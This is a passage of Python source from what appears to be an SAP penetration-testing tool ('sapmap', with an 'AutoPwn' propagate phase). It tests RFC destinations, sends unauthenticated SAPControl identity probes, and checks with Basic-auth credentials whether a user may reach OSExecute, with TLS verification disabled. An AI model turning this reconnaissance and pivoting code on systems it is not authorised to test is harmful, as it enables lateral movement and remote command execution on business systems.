        result["ping_status"] = str(check_result.get("EV_PING_STATUS", "")).strip()
        logon_status = check_result.get("EV_LOGON_STATUS", "")
        if str(logon_status).strip() == "1":
            result["logon_ok"] = True
        else:
            result["logon_ok"] = RFC_LOGON_SUCCESS_TEXT in result["logon_message"]

        lat_ms = check_result.get("EV_LATENCY_IN_MS", 0)
        if isinstance(lat_ms, int) and lat_ms > 0:
            result["latency_ms"] = lat_ms
        else:
            latency_msg = check_result.get("EV_LATENCY_MESSAGE", "")
            if latency_msg:
                try:
                    import re
                    match = re.search(r'(\d+)', latency_msg)
                    if match:
                        result["latency_ms"] = int(match.group(1))
                except Exception:
                    pass
        return True
    except ABAPApplicationError as e:
        if getattr(e, "key", "") == "FU_NOT_FOUND":
            return False  # FM doesn't exist — caller should use fallback
        raise


def _test_via_dest_check(conn, destination_name: str, result: dict):
    """Fallback: use DEST_CHECK_CONNECTION (available on older NW releases).

    AUTHORIZATION_TEST_RESULT='' means logon OK, 'E' means failed.
    CONNECTION_TEST_RESULT='' means TCP connection OK.
    CONNECTION_PROPERTIES contains remote SID, client, basis release.
    """
    # Bound at 25 s — a broken destination pointing at a dead gateway
    # otherwise hangs the FM inside the source kernel indefinitely.
    # Mirrors the timeout on _test_via_sdf_rfc_check so both probe
    # paths respect the same wall-clock ceiling.
    check_result, timed_out = _run_with_timeout(
        conn.call, 25.0, "DEST_CHECK_CONNECTION", NAME=destination_name)
    if timed_out:
        _detach_if_timed_out(conn, True)
        result["logon_ok"] = False
        result["ping_ok"] = False
        result["error"] = (f"timeout after 25s on DEST_CHECK_CONNECTION "
                            f"— destination probably points at a dead "
                            f"gateway")
        logger.debug(f"DEST_CHECK_CONNECTION on {destination_name} "
                      f"timed out")
        return

    auth_result = check_result.get("AUTHORIZATION_TEST_RESULT", "X").strip()
    conn_result = check_result.get("CONNECTION_TEST_RESULT", "X").strip()
    auth_error = check_result.get("AUTHORIZATION_ERROR_TEXT", "").strip()
    conn_error = check_result.get("CONNECTION_ERROR_TEXT", "").strip()

    result["logon_ok"] = auth_result == ""
    result["ping_ok"] = conn_result == ""
    result["logon_message"] = auth_error or ("RFC Logon successful."
                                             if result["logon_ok"] else "")

    # Extract remote system info from CONNECTION_PROPERTIES
    props = check_result.get("CONNECTION_PROPERTIES", {})
    if isinstance(props, dict):
        result["remote_sid"] = props.get("SYSID", "").strip()
        result["remote_client"] = props.get("CLIENT_USED", "").strip()
        result["remote_release"] = props.get("BASIS_RELEASE", "").strip()


def _test_via_dest_check_raw(conn, destination_name: str, result: dict):
    """Fallback: call DEST_CHECK_CONNECTION via call_raw (bypasses
    RFC_GET_FUNCTION_INTERFACE).  Used when the user has SAP_ALL in
    the database but the authorization buffer hasn't been refreshed yet.
    """
    from sap_rfc_ctypes import RFCTYPE_STRUCTURE, RFC_CHANGING

    # Build DEST_CHECK_CONNECTION function description manually
    # Parameters: NAME (import CHAR 32), AUTHORIZATION_TEST_RESULT (export CHAR 1),
    #             CONNECTION_TEST_RESULT (export CHAR 1), etc.
    props_td = conn._make_type_desc('DEST_CHECK_PROPS', [
        ('SYSID',         RFCTYPE_CHAR, 8,  16),
        ('CLIENT_USED',   RFCTYPE_CHAR, 3,  6),
        ('BASIS_RELEASE', RFCTYPE_CHAR, 4,  8),
        ('HOSTNAME',      RFCTYPE_CHAR, 32, 64),
        ('IPADDR',        RFCTYPE_CHAR, 15, 30),
    ])

    func_desc = conn._make_func_desc('DEST_CHECK_CONNECTION', [
        ('NAME',                       RFC_IMPORT, RFCTYPE_CHAR,      64,  32, None),
        ('AUTHORIZATION_TEST_RESULT',  RFC_EXPORT, RFCTYPE_CHAR,      2,   1,  None),
        ('AUTHORIZATION_ERROR_TEXT',   RFC_EXPORT, RFCTYPE_CHAR,      150, 75, None),
        ('CONNECTION_TEST_RESULT',     RFC_EXPORT, RFCTYPE_CHAR,      2,   1,  None),
        ('CONNECTION_ERROR_TEXT',      RFC_EXPORT, RFCTYPE_CHAR,      150, 75, None),
        ('CONNECTION_PROPERTIES',      RFC_EXPORT, RFCTYPE_STRUCTURE, 0,   0,  props_td),
    ])

    # Same 25 s cap as the metadata-driven fallback — call_raw skips
    # RFC_GET_FUNCTION_INTERFACE but still blocks inside the kernel FM
    # when the destination is dead.
    check_result, timed_out = _run_with_timeout(
        conn.call_raw, 25.0, 'DEST_CHECK_CONNECTION', func_desc,
        NAME=destination_name)
    if timed_out:
        _detach_if_timed_out(conn, True)
        result["logon_ok"] = False
        result["ping_ok"] = False
        result["error"] = (f"timeout after 25s on DEST_CHECK_CONNECTION "
                            f"(raw) — destination probably points at a "
                            f"dead gateway")
        logger.debug(f"DEST_CHECK_CONNECTION raw on {destination_name} "
                      f"timed out")
        return

    auth_result = check_result.get("AUTHORIZATION_TEST_RESULT", "X").strip()
    conn_result = check_result.get("CONNECTION_TEST_RESULT", "X").strip()
    auth_error = check_result.get("AUTHORIZATION_ERROR_TEXT", "").strip()

    result["logon_ok"] = auth_result == ""
    result["ping_ok"] = conn_result == ""
    result["logon_message"] = auth_error or ("RFC Logon successful."
                                             if result["logon_ok"] else "")

    props = check_result.get("CONNECTION_PROPERTIES", {})
    if isinstance(props, dict):
        result["remote_sid"] = props.get("SYSID", "").strip()
        result["remote_client"] = props.get("CLIENT_USED", "").strip()
        result["remote_release"] = props.get("BASIS_RELEASE", "").strip()


TEST_RFC_DESTINATION_OVERALL_TIMEOUT = 60.0
"""Wall-clock ceiling for :func:`test_rfc_destination`.

Fires when every inner per-call timeout has already failed to bound the
work — a defence-in-depth backstop against pyrfc / SDK / connection-open
paths that don't respect Python-level thread abandonment.  60 s comfortably
exceeds the sum of the inner ``/SDF/RFC_CHECK`` (25 s) and
``DEST_CHECK_CONNECTION`` (25 s) caps, so legitimately slow destinations
still complete.  Overrides above this ceiling defeat the safety net —
operators who need longer waits should raise the individual per-call
timeouts, not this one.
"""


def test_rfc_destination(node: SAPNode, destination_name: str,
                         creds: Credentials = None,
                         rfc_check_cache: dict = None,
                         rfc_conn=None) -> dict:
    """Test an RFC destination via /SDF/RFC_CHECK, falling back to
    DEST_CHECK_CONNECTION on older systems where the FM doesn't exist.

    Returns dict with: logon_ok, ping_ok, latency_ms, logon_message, error

    When ``rfc_conn`` (RFCConnection) is supplied and its ``conn_type``
    is 'http', interpret_http_dest_test_result() is invoked afterwards
    to apply SAP Note 1177315's benign-status rule for ADS destinations.
    Callers that already have the RFCConnection handy should pass it in.

    Wall-clock bounded at :data:`TEST_RFC_DESTINATION_OVERALL_TIMEOUT` —
    after that a graceful failure dict is returned regardless of which
    inner call is stuck.  The bulk-retrieve caller (AutoPwn's propagate
    phase, GUI Test RFCs) can then move on to the next destination.
    """
    # Cache lookup and cache-write happen in the wrapper so the impl
    # is a pure function of (node, dest, creds) — safer to abandon
    # to a daemon thread if the timeout fires.
    if rfc_check_cache and destination_name in rfc_check_cache:
        return rfc_check_cache[destination_name]

    result, timed_out = _run_with_timeout(
        _test_rfc_destination_impl,
        TEST_RFC_DESTINATION_OVERALL_TIMEOUT,
        node, destination_name, creds, rfc_conn)

    if timed_out:
        result = {
            "logon_ok": False,
            "ping_ok": False,
            "latency_ms": 0,
            "logon_message": "",
            "error": (f"overall timeout {int(TEST_RFC_DESTINATION_OVERALL_TIMEOUT)}s — "
                       f"destination is unresponsive, skipping"),
        }
        # Print so the operator sees the skip in the AutoPwn log — a
        # silent-return would look identical to a hang from the outside.
        print(f"[-] RFC {destination_name}: watchdog timeout after "
              f"{int(TEST_RFC_DESTINATION_OVERALL_TIMEOUT)}s — skipping "
              f"(destination unresponsive, continuing with next)")
        logger.debug(
            f"test_rfc_destination watchdog fired for "
            f"{destination_name}@{node.sid} after "
            f"{TEST_RFC_DESTINATION_OVERALL_TIMEOUT}s")

    if rfc_check_cache is not None:
        rfc_check_cache[destination_name] = result
    return result


def _test_rfc_destination_impl(node: SAPNode, destination_name: str,
                                creds: Credentials = None,
                                rfc_conn=None) -> dict:
    """Body of :func:`test_rfc_destination` — split out so the public
    entry point can wrap it in an overall watchdog.  Never called
    directly by anything other than the wrapper.
    """
    result = {
        "logon_ok": False,
        "ping_ok": False,
        "latency_ms": 0,
        "logon_message": "",
        "error": "",
    }

    try:
        with _get_connection(node, creds) as conn:
            if not _test_via_sdf_rfc_check(conn, destination_name, result):
                # /SDF/RFC_CHECK not available — fall back
                logger.debug(f"/SDF/RFC_CHECK not found on {node.sid}, "
                             f"using DEST_CHECK_CONNECTION")
                _test_via_dest_check(conn, destination_name, result)

    except Exception as e:
        err_msg = format_rfc_exception(e).split("\n")[0]
        result["error"] = err_msg
        logger.debug(f"RFC check failed for {destination_name}@{node.sid}: {format_rfc_exception(e)}")

        # If the error is due to RFC_GET_FUNCTION_INTERFACE not authorized,
        # try again with call_raw (bypasses the SDK metadata lookup)
        if "RFC_GET_FUNCTION_INTERFACE" in format_rfc_exception(e) or "No RFC authorization" in format_rfc_exception(e):
            try:
                with _get_connection(node, creds) as conn:
                    _test_via_dest_check_raw(conn, destination_name, result)
                    result["error"] = ""  # clear the error on success
            except Exception as e2:
                result["error"] = format_rfc_exception(e2).split("\n")[0]
                logger.debug(f"call_raw DEST_CHECK also failed: {format_rfc_exception(e2)}")

    # Note 1177315 rule for HTTP destinations: reinterpret benign
    # 4xx/5xx statuses as ping_ok=True.  Only fires when the caller
    # passed the RFCConnection so we know the destination type.
    if rfc_conn is not None:
        try:
            interpret_http_dest_test_result(rfc_conn, result)
        except Exception:
            pass

    return result


def ping_rfc_destination(node: SAPNode, destination_name: str,
                         creds: Credentials = None) -> dict:
    """Ping an RFC destination via DEST_CHECK_CONNECTION (primary) which
    also returns the remote SID, falling back to /SDF/RFC_CHECK + separate
    RFC_GET_SYSTEM_INFO if DEST_CHECK_CONNECTION is unavailable.

    Returns dict with: ping_ok, ping_message, remote_sid, remote_hostname,
                       logon_ok, error
    """
    result = {
        "ping_ok": False, "ping_message": "", "logon_ok": False,
        "remote_sid": "", "remote_hostname": "", "remote_ip": "",
        "remote_instance_nr": "", "error": "",
    }

    try:
        with _get_connection(node, creds) as conn:
            # Primary: DEST_CHECK_CONNECTION — returns SID in one call.
            # Bounded at 20 s; a broken SM59 destination otherwise blocks
            # at the TCP layer for 60-120 s and stalls bulk retrieve.
            try:
                check_result, timed_out = _run_with_timeout(
                    conn.call, 20.0,
                    "DEST_CHECK_CONNECTION", NAME=destination_name)
                if timed_out:
                    # Daemon worker is still inside RfcInvoke.  Detach the
                    # handle so the enclosing `with` block's close()
                    # becomes a no-op — otherwise RfcCloseConnection
                    # would itself block waiting for the Invoke to drain.
                    _detach_if_timed_out(conn, True)
                    result["ping_ok"] = False
                    result["error"] = (
                        f"timeout after 20s — destination probably points "
                        f"at a dead gateway")
                    logger.debug(f"DEST_CHECK_CONNECTION on "
                                  f"{destination_name}@{node.sid} timed out")
                    return result
                conn_result = check_result.get(
                    "CONNECTION_TEST_RESULT", "X").strip()
                auth_result = check_result.get(
                    "AUTHORIZATION_TEST_RESULT", "X").strip()
                result["ping_ok"] = conn_result == ""
                result["logon_ok"] = auth_result == ""
                result["ping_message"] = (
                    check_result.get("CONNECTION_ERROR_TEXT", "").strip()
                    or ("OK" if result["ping_ok"] else ""))

                props = check_result.get("CONNECTION_PROPERTIES", {})
                if isinstance(props, dict):
                    result["remote_sid"] = props.get(
                        "SYSID", "").strip()
                    result["remote_hostname"] = props.get(
                        "RFCHOST", "").strip()
                    # CONNECTION_PROPERTIES doesn't carry RFCDEST —
                    # instance_nr comes from RFCSI_EXPORT below (Type-3
                    # RFC only) or from the direct HTTP probe (HTTP).

                # Get IP via RFC_GET_SYSTEM_INFO with DESTINATION
                # (RFCSI_EXPORT contains RFCIPADDR; CONNECTION_PROPERTIES does not).
                # Bound this call too — a destination that passed
                # DEST_CHECK_CONNECTION can still hang on an unrelated
                # second RFC call if the remote side is slow.  15s cap.
                if result["ping_ok"]:
                    try:
                        info, sys_timed_out = _run_with_timeout(
                            conn.call, 15.0,
                            "RFC_GET_SYSTEM_INFO",
                            DESTINATION=destination_name)
                        if sys_timed_out:
                            _detach_if_timed_out(conn, True)
                            logger.debug(f"RFC_GET_SYSTEM_INFO on "
                                          f"{destination_name} timed out "
                                          f"— ping_ok kept, IP skipped")
                            # Don't fall through to the assertions below
                            # that would dereference None
                            raise RuntimeError("sys_info timeout")
                        export = info.get("RFCSI_EXPORT", {})
                        if isinstance(export, dict):
                            result["remote_ip"] = (
                                export.get("RFCIPV6ADDR", "")
                                or export.get("RFCIPADDR", "")
                                or "").strip()
                            if not result["remote_sid"]:
                                result["remote_sid"] = (
                                    export.get("RFCSYSID", "")
                                    or "").strip()
                            if not result["remote_hostname"]:
                                result["remote_hostname"] = (
                                    export.get("RFCHOST", "")
                                    or "").strip()
                            if not result["remote_instance_nr"]:
                                _rd = (export.get("RFCDEST", "")
                                       or "").strip()
                                if _rd:
                                    import re as _re_rd
                                    _mi = _re_rd.search(
                                        r'_(\d{2})$', _rd)
                                    if _mi:
                                        result["remote_instance_nr"] = (
                                            _mi.group(1))
                    except Exception:
                        pass
            except ABAPApplicationError as e:
                if getattr(e, "key", "") == "FU_NOT_FOUND":
                    # DEST_CHECK_CONNECTION not available — fall back to
                    # /SDF/RFC_CHECK for ping + RFC_GET_SYSTEM_INFO for SID
                    logger.debug("DEST_CHECK_CONNECTION not found, "
                                 "falling back to /SDF/RFC_CHECK")
                    try:
                        # 20s cap — same logic as DEST_CHECK_CONNECTION.
                        check_result, fb_timeout = _run_with_timeout(
                            conn.call, 20.0,
                            RFC_CHECK_FM,
                            IV_DESTINATION=destination_name,
                            IV_PING="X")
                        if fb_timeout:
                            _detach_if_timed_out(conn, True)
                            logger.debug(f"/SDF/RFC_CHECK fallback on "
                                          f"{destination_name} timed out")
                            result["error"] = (
                                f"timeout after 20s on /SDF/RFC_CHECK "
                                f"fallback — destination probably broken")
                        else:
                            msg = check_result.get(
                                "EV_PING_MESSAGE", "").strip()
                            status = str(check_result.get(
                                "EV_PING_STATUS", "")).strip()
                            result["ping_message"] = msg
                            result["ping_ok"] = status == "1"
                    except ABAPApplicationError as e2:
                        if getattr(e2, "key", "") != "FU_NOT_FOUND":
                            raise
                    # Get SID separately — also bounded.
                    if result["ping_ok"]:
                        try:
                            info, sys_timeout = _run_with_timeout(
                                conn.call, 15.0,
                                "RFC_GET_SYSTEM_INFO",
                                DESTINATION=destination_name)
                            if sys_timeout:
                                _detach_if_timed_out(conn, True)
                                raise RuntimeError("sys_info timeout")
                            export = info.get("RFCSI_EXPORT", {})
                            if isinstance(export, dict):
                                result["remote_sid"] = (
                                    export.get("RFCSYSID", "")
                                    or "").strip()
                                result["remote_hostname"] = (
                                    export.get("RFCHOST", "")
                                    or "").strip()
                                result["remote_ip"] = (
                                    export.get("RFCIPV6ADDR", "")
                                    or export.get("RFCIPADDR", "")
                                    or "").strip()
                                if not result["remote_instance_nr"]:
                                    _rd2 = (export.get(
                                        "RFCDEST", "") or "").strip()
                                    if _rd2:
                                        import re as _re2
                                        _m2 = _re2.search(
                                            r'_(\d{2})$', _rd2)
                                        if _m2:
                                            result[
                                                "remote_instance_nr"
                                            ] = _m2.group(1)
                        except Exception:
                            pass
                else:
                    raise
    except Exception as e:
        result["error"] = format_rfc_exception(e)

    # Skip cascading fallbacks when our primary timed out — that
    # means the destination's gateway/host IS unreachable (not just
    # the FM is missing).  Running IWB and direct-connect fallbacks
    # just stacks another 60-120 s of TCP retries per destination.
    primary_timed_out = "timeout" in (result.get("error") or "").lower()

    # Fallback: IWB_SHE_RFCDESTINATION_CHECK (available on older kernels
    # where DEST_CHECK_CONNECTION and /SDF/RFC_CHECK don't work)
    if not result["ping_ok"] and result["error"] and not primary_timed_out:
        try:
            result.update(_ping_via_iwb_check(node, destination_name, creds))
        except Exception as e2:
            logger.debug(f"IWB_SHE check also failed: {format_rfc_exception(e2)}")

    # Last-resort fallback: parse RFCDES options and try direct TCP connect
    if not result["ping_ok"] and result["error"] and not primary_timed_out:
        try:
            result.update(_ping_via_direct_connect(node, destination_name, creds))
        except Exception as e2:
            logger.debug(f"Direct connect fallback also failed: {format_rfc_exception(e2)}")

    return result


def _run_sapcontrol_identity_probe(host, port, is_https, result,
                                     timeout, _sock):
    """Populate result["remote_sid"] / "remote_hostname" /
    "remote_instance_nr" via an UNAUTHENTICATED SAPControl
    GetInstanceProperties call.

    Every SAP kernel serves that method with protection=NONE, so no
    credential is needed.  Probes up to three port slots on the same
    host in priority order:
      1. The URL's own port when it matches SAPControl (5NN13/14) or
         Host Agent (1128/1129).
      2. The PARALLEL SAPControl port when the URL is Java HTTP
         (5NN00 → 5NN13/14 on the same instance) or ABAP ICM
         (80NN → 5NN13/14 on inst NN).
      3. Host Agent 1128 as a universal fallback.
    Never overwrites remote_sid when a preceding path (ICF-NF
    error page) already set it.
    """
    if result.get("remote_sid"):
        return
    import re as _re
    _identity_candidates = []
    _port_is_sapcontrol = (
        50000 <= port <= 59999 and port % 100 in (13, 14))
    _port_is_hostagent = port in (1128, 1129)
    _port_is_java_http = (
        50000 <= port <= 59999 and port % 100 in (0, 1))
    _port_is_abap_icm = (
        (8000 <= port <= 8099)
        or (44300 <= port <= 44399))
    if _port_is_sapcontrol:
        _identity_candidates.append((port, is_https,
                                       "/SAPControl.CGI"))
    elif _port_is_hostagent:
        _identity_candidates.append((port, is_https, "/"))
    elif _port_is_java_http:
        _nn = (port - 50000) // 100
        _identity_candidates.append((50013 + _nn * 100, False,
                                       "/SAPControl.CGI"))
        _identity_candidates.append((50014 + _nn * 100, True,
                                       "/SAPControl.CGI"))
    elif _port_is_abap_icm:
        _nn = ((port - 8000) if 8000 <= port <= 8099
               else (port - 44300))
        _identity_candidates.append((50013 + _nn * 100, False,
                                       "/SAPControl.CGI"))
        _identity_candidates.append((50014 + _nn * 100, True,
                                       "/SAPControl.CGI"))
    _identity_candidates.append((1128, False, "/"))

    _sc_body = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<SOAP-ENV:Envelope xmlns:SOAP-ENV='
        '"http://schemas.xmlsoap.org/soap/envelope/">'
        '<SOAP-ENV:Body>'
        '<ns1:GetInstanceProperties xmlns:ns1="urn:SAPControl"/>'
        '</SOAP-ENV:Body></SOAP-ENV:Envelope>'
    ).encode("utf-8")

    for _cand_port, _cand_https, _cand_path in _identity_candidates:
        if result.get("remote_sid"):
            return
        try:
            _sc_hdr = (
                f"POST {_cand_path} HTTP/1.0\r\n"
                f"Host: {host}:{_cand_port}\r\n"
                f"Content-Type: text/xml; charset=utf-8\r\n"
                f"Content-Length: {len(_sc_body)}\r\n"
                f"SOAPAction: \"\"\r\n"
                f"User-Agent: sapmap-sapcontrol-ident/1.0\r\n"
                f"Connection: close\r\n\r\n"
            ).encode("iso-8859-1")
            _s3 = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            _s3.settimeout(min(timeout, 3.0))
            _s3.connect((host, _cand_port))
            if _cand_https:
                import ssl as _ssl
                ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = _ssl.CERT_NONE
                try:
                    ctx.minimum_version = _ssl.TLSVersion.TLSv1
                except (AttributeError, ValueError):
                    pass
                _s3 = ctx.wrap_socket(_s3, server_hostname=host)
            _s3.sendall(_sc_hdr + _sc_body)
            _sc_resp = b""
            try:
                while len(_sc_resp) < 65536:
                    chunk = _s3.recv(4096)
                    if not chunk:
                        break
                    _sc_resp += chunk
            except _sock.timeout:
                pass
            try:
                _s3.close()
            except Exception:
                pass
            _props = {}
            for _item in _re.findall(
                    rb'<item>(.*?)</item>', _sc_resp, _re.DOTALL):
                _mp = _re.search(
                    rb'<(?:[A-Za-z0-9_]+:)?property[^>]*>'
                    rb'([^<]*)</(?:[A-Za-z0-9_]+:)?property>',
                    _item, _re.I)
                _mv = _re.search(
                    rb'<(?:[A-Za-z0-9_]+:)?value[^>]*>'
                    rb'([^<]*)</(?:[A-Za-z0-9_]+:)?value>',
                    _item, _re.I)
                if _mp and _mv:
                    _k = _mp.group(1).decode(
                        "iso-8859-1", "replace").strip().upper()
                    _v = _mv.group(1).decode(
                        "iso-8859-1", "replace").strip()
                    if _k:
                        _props[_k] = _v
            _sc_sid = (_props.get("SAPSYSTEMNAME") or "").strip()
            if len(_sc_sid) == 3 and _sc_sid.isalnum():
                result["remote_sid"] = _sc_sid
                _sc_host = (_props.get("SAPLOCALHOST")
                             or _props.get("INSTANCE_NAME")
                             or "").strip()
                if _sc_host:
                    result["remote_hostname"] = (
                        result["remote_hostname"] or _sc_host)
                _sc_inst = (_props.get("SAPSYSTEM") or "").strip()
                if _sc_inst.isdigit():
                    result["remote_instance_nr"] = _sc_inst.zfill(2)
        except Exception:
            continue


def http_dest_ping(rfc_conn, timeout: float = 5.0) -> dict:
    """Ping a Type-G / Type-H HTTP RFC destination directly.

    The generic ``ping_rfc_destination`` path routes through
    DEST_CHECK_CONNECTION → /SDF/RFC_CHECK → IWB_SHE_RFCDESTINATION_CHECK
    → last-resort direct-TCP-on-33NN.  That last fallback is wrong for
    HTTP destinations: it treats the RFCOPTIONS ``S=`` value as an
    instance number and TCP-connects to ``3300 + int(S)`` — but for
    Type-G/H, ``S=`` is the HTTP port.  Result: a Type-G to
    10.10.1.38:50313 gets probed at 10.10.1.38:3300 and reports
    "not reachable" even when the ICM answers instantly.

    This helper takes the RFCConnection directly, parses conn.http_url,
    does a TCP+HTTP probe against the correct host:port, applies the
    Note 1177315 rule for benign 4xx/5xx statuses, and returns the
    same shape as ``ping_rfc_destination`` so the caller loop can
    swap it in transparently.

    Returns:
      { ping_ok, ping_message, remote_sid, remote_hostname,
        remote_ip, remote_instance_nr, logon_ok, error }
    """
    import socket as _sock
    from urllib.parse import urlparse
    result = {
        "ping_ok": False, "ping_message": "", "logon_ok": False,
        "remote_sid": "", "remote_hostname": "", "remote_ip": "",
        "remote_instance_nr": "", "error": "",
    }
    url = (rfc_conn.http_url or "").strip()
    if not url:
        result["error"] = "no http_url on destination"
        return result
    try:
        parts = urlparse(url)
    except Exception as e:
        result["error"] = f"invalid http_url: {e}"
        return result
    host = parts.hostname or ""
    if not host:
        result["error"] = "http_url has no hostname"
        return result
    scheme = (parts.scheme or "http").lower()
    port = parts.port or (443 if scheme == "https" else 80)
    is_https = scheme == "https"

    # 0. Identity probe — fire BEFORE the URL's own TCP connect so
    # we still learn the target's SID/host/instance even when the
    # URL port is firewalled from us but SAPControl on a parallel
    # port answers.  Same host, only a few probe targets; bounded
    # per-candidate timeout so total budget stays modest.
    _run_sapcontrol_identity_probe(host, port, is_https, result,
                                     timeout, _sock)

    # 1. TCP-level reachability.  Fast fail on refused / timeout /
    # DNS error — no point sending an HTTP request if the socket
    # never opens.
    try:
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
    except Exception as e:
        result["error"] = (f"TCP connect to {host}:{port} failed: "
                           f"{type(e).__name__}: {e}")
        return result

    # 2. HTTP round-trip.  A GET on the destination's own path is the
    # closest match to what SM59 Test Connection does.  Wrap in TLS
    # when the URL is HTTPS.
    path = parts.path or "/"
    if parts.query:
        path = f"{path}?{parts.query}"
    try:
        if is_https:
            import ssl as _ssl
            ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            try:
                ctx.minimum_version = _ssl.TLSVersion.TLSv1
            except (AttributeError, ValueError):
                pass
            s = ctx.wrap_socket(s, server_hostname=host)
        req = (f"GET {path} HTTP/1.0\r\nHost: {host}:{port}\r\n"
               f"User-Agent: sapmap-http-ping/1.0\r\n"
               f"Connection: close\r\n\r\n").encode("iso-8859-1")
        s.sendall(req)
        resp = b""
        try:
            while len(resp) < 8192:
                chunk = s.recv(2048)
                if not chunk:
                    break
                resp += chunk
        except _sock.timeout:
            pass
        try:
            s.close()
        except Exception:
            pass
    except Exception as e:
        result["ping_ok"] = True  # TCP opened, HTTP faulted — target IS up
        result["ping_message"] = (f"TCP open on {host}:{port}, "
                                   f"HTTP faulted: {type(e).__name__}")
        return result

    # 3. Parse the response.  ANY status code proves the target
    # answered — that's the working definition of ping_ok for HTTP
    # destinations, mirroring what DEST_CHECK_CONNECTION would say if
    # it handled Type-G correctly.
    import re as _re
    m_status = _re.search(rb"HTTP/\S+\s+(\d{3})", resp)
    http_status = int(m_status.group(1)) if m_status else 0
    rfc_conn.http_status = http_status
    result["ping_ok"] = True
    result["ping_message"] = (f"HTTP {http_status} from {host}:{port}"
                              if http_status else
                              f"connected to {host}:{port}")
    result["remote_ip"] = host if _re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$",
                                             host) else ""
    result["remote_hostname"] = ("" if result["remote_ip"] else host)

    # 4. ICF-NF error page carries HOST_SID_NN — lift SID + instance
    # if it's present.  Same regex as fingerprint_web_dispatcher.
    _icf = _re.search(
        rb'ICF-NF-http-i([A-Za-z0-9._-]+)_([A-Z0-9]{3})_(\d{2})-',
        resp)
    if _icf:
        result["remote_hostname"] = (result["remote_hostname"]
                                      or _icf.group(1).decode(
                                          "iso-8859-1", "replace"))
        result["remote_sid"] = _icf.group(2).decode("ascii", "replace")
        result["remote_instance_nr"] = _icf.group(3).decode("ascii",
                                                              "replace")

    # 4b. Re-run the SAPControl identity probe now that we have the
    # target's HTTP response too — the top-of-function call may
    # have missed if we're calling this helper standalone.  Cheap
    # no-op when remote_sid is already populated.
    _run_sapcontrol_identity_probe(host, port, is_https, result,
                                     timeout, _sock)
    # 5. Note 1177315: reinterpret 403/404/405/500 as benign when the
    # destination is ADS-shaped.  Marker-in-body also triggers.
    resp_low = resp.lower()
    marker_hit = any(
        m in resp_low for m in (
            b"expected request method post",
            b"com.sap.soa.wsr.030104",
            b"wsaddressingexception",
        )
    )
    if marker_hit and not rfc_conn.is_ads_dest:
        rfc_conn.is_ads_dest = True
    if (rfc_conn.is_ads_dest
            and (marker_hit
                 or http_status in (403, 404, 405, 500))):
        rfc_conn.note_1177315_hit = True
        result["ping_message"] += (
            f"  [Note 1177315: HTTP {http_status} on ADS destination "
            f"— target answered]")

    return result


def sapcontrol_auth_probe(url: str, user: str, password: str,
                             timeout: float = 8.0) -> dict:
    """Basic-auth probe against a SAPControl / SAP Host Agent endpoint.

    SAPControl doesn't implement RFC_PING (that's the ABAP RFC layer);
    it exposes its own SOAP contract at urn:SAPControl.  The lightest
    call that requires auth is <GetProcessList/> — unhardened
    installs answer 200 with an <item> array when the credential is
    valid, 401 when it isn't.

    Returns dict with:
      ok        — True iff the endpoint answered 200 with SAPControl
                    content (SID/instance/process list).
      status    — HTTP status code from the response.
      error     — populated on network / TLS / non-200 failures.
      sid, instance_nr, hostname — lifted from the response body
                    when the auth succeeded (SAPControl includes
                    <SAPSYSTEMNAME>, <instanceNr>, <hostname> in
                    every response).
      response_body — first 2 KiB of the response, for the operator's
                       benefit when debugging non-200s.
    """
    import socket as _sock
    import base64 as _b64
    from urllib.parse import urlparse
    out = {"ok": False, "status": 0, "error": "",
            "sid": "", "instance_nr": "", "hostname": "",
            "response_body": "",
            # Stage-2 AccessCheck fields — always present, so callers
            # can .get() without worrying whether stage 1 short-
            # circuited before we ran the auth probe.
            "osexec_access": -1,
            "access_check_status": 0,
            "access_check_error": "",
            "os_name": "",
            "stack_hint": ""}
    if not url:
        out["error"] = "empty URL"
        return out
    try:
        parts = urlparse(url)
    except Exception as e:
        out["error"] = f"invalid URL: {e}"
        return out
    host = parts.hostname or ""
    if not host:
        out["error"] = "no hostname in URL"
        return out
    scheme = (parts.scheme or "http").lower()
    is_https = scheme == "https"
    port = parts.port or (443 if is_https else 80)
    # The destination's own path (usually /SAPControl.CGI or
    # /SAPHostControl.CGI) is where the SOAP endpoint lives.
    path = parts.path or "/SAPControl.CGI"

    # Two-stage probe:
    #
    # 1. GetInstanceProperties — SAP kernel serves this WITHOUT
    #    authentication by default (protection=NONE in the SAPControl
    #    ACL).  Confirms the endpoint IS a SAPControl webservice and
    #    lets us lift SID / instance / host from the response.  Does
    #    NOT validate the credential — that was the old bug behind
    #    "SAPControl auth OK" followed by "HTTP 500 Invalid
    #    Credentials" on the first OSExecute attempt.
    #
    # 2. AccessCheck(function="OSExecute") — SAP designed this
    #    specifically to test whether the caller is authorized to
    #    invoke a given SAPControl method WITHOUT actually invoking
    #    it (no audit trail from a fake command).  Requires basic
    #    auth: HTTP 500 "Invalid Credentials" when the password is
    #    wrong; HTTP 200 with <access>1</access> when the user is
    #    permitted; HTTP 200 with <access>0</access> when the user
    #    authenticates but lacks S_ADMI_FCD-equivalent authz for
    #    OSExecute.
    #
    # os_exec_verified is only set (by the caller) when stage 2
    # returns 200 + access=1.  Stage 1 alone is not enough.
    body = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<SOAP-ENV:Envelope xmlns:SOAP-ENV='
        '"http://schemas.xmlsoap.org/soap/envelope/">'
        '<SOAP-ENV:Body>'
        '<ns1:GetInstanceProperties xmlns:ns1="urn:SAPControl"/>'
        '</SOAP-ENV:Body></SOAP-ENV:Envelope>'
    )
    body_bytes = body.encode("utf-8")
    auth = _b64.b64encode(
        f"{user}:{password}".encode("utf-8")).decode("ascii")
    hdr = (
        f"POST {path} HTTP/1.0\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: text/xml; charset=utf-8\r\n"
        f"Content-Length: {len(body_bytes)}\r\n"
        f"SOAPAction: \"\"\r\n"
        f"Authorization: Basic {auth}\r\n"
        f"User-Agent: sapmap-sapcontrol-probe/1.0\r\n"
        f"Connection: close\r\n\r\n"
    ).encode("iso-8859-1")

    try:
